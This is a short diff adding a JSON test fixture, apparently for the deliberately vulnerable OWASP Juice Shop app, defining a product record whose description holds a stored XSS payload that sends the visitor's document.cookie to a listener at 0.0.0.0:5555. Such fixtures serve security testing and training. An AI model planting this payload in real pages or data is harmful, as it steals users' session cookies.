@@ -1,0 +1,12 @@
+{
+  "payloadJuiceShopXSS3" : {
+      "id":1,
+      "name":"Apple Juice (1000ml)",
+      "description":"Stored XSS (calls malicious Server) : <script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie</script>",
+      "price":1.99,
+      "image":"apple_juice.jpg",
+      "createdAt":"2016-11-23 11:02:05.000 +00:00",
+      "updatedAt":"2016-11-23 11:02:05.000 +00:00",
+      "deletedAt":null
+  }
+}
